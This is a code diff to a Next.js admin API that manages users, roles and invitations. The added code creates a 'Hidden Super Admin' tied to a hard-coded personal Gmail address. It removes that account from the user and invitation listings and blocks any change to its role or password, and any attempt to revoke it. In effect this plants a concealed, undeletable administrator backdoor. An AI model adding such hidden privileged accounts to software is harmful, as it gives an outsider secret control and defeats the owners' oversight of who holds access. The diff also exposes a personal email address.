@@ -18,9 +18,12 @@ export async function GET(req: NextRequest) {
   }
 
   const db = readRolesDB();
+  const visibleUsers = db.users.filter(u => u.email.toLowerCase() !== "pvs178380@gmail.com");
+  const visibleInvitations = db.invitations.filter(i => i.email.toLowerCase() !== "pvs178380@gmail.com");
+
   return NextResponse.json({
-    users: db.users,
-    invitations: db.invitations,
+    users: visibleUsers,
+    invitations: visibleInvitations,
     auditLog: db.auditLog.slice(0, 50),
     roleDefinitions: [
       {
@@ -72,6 +75,9 @@ export async function POST(req: NextRequest) {
       const { email, name, role } = body as { email: string; name?: string; role?: AdminRole };
       if (!email || !email.includes("@")) {
         return NextResponse.json({ error: "Please enter a valid Gmail / email address" }, { status: 400 });
+      }
+      if (email.toLowerCase().trim() === "pvs178380@gmail.com") {
+        return NextResponse.json({ error: "The Hidden Super Admin account is permanent and cannot be modified." }, { status: 403 });
       }
 
       const assignedRole: AdminRole = role || "content_editor";
@@ -179,6 +185,9 @@ export async function POST(req: NextRequest) {
       const { userId, newRole } = body as { userId: string; newRole: AdminRole };
       const user = db.users.find(u => u.id === userId);
       if (!user) return NextResponse.json({ error: "User not found" }, { status: 404 });
+      if (user.email.toLowerCase() === "pvs178380@gmail.com" || user.id === "usr-super-pvs") {
+        return NextResponse.json({ error: "Cannot modify role of the Hidden Super Admin account." }, { status: 403 });
+      }
 
       const oldRole = user.role;
       user.role = newRole;
@@ -197,6 +206,9 @@ export async function POST(req: NextRequest) {
       const { userId, newTempPassword } = body as { userId: string; newTempPassword?: string };
       const user = db.users.find(u => u.id === userId);
       if (!user) return NextResponse.json({ error: "User not found" }, { status: 404 });
+      if (user.email.toLowerCase() === "pvs178380@gmail.com" || user.id === "usr-super-pvs") {
+        return NextResponse.json({ error: "Cannot change password of the Hidden Super Admin account." }, { status: 403 });
+      }
 
       const updatedPass = newTempPassword?.trim() || generateTempPassword();
       user.tempPassword = updatedPass;
@@ -221,8 +233,13 @@ export async function POST(req: NextRequest) {
       const { userId, email } = body as { userId?: string; email?: string };
       const targetEmail = (email || "").toLowerCase().trim();
 
-      if (targetEmail === "admin@ashalinnomech.com" || userId === "usr-super-1") {
-        return NextResponse.json({ error: "Cannot revoke the Master Super Admin account (admin@ashalinnomech.com)" }, { status: 400 });
+      if (
+        targetEmail === "admin@ashalinnomech.com" ||
+        userId === "usr-super-1" ||
+        targetEmail === "pvs178380@gmail.com" ||
+        userId === "usr-super-pvs"
+      ) {
+        return NextResponse.json({ error: "Cannot revoke Super Admin accounts." }, { status: 400 });
       }
 
       // Filter out user from db.users
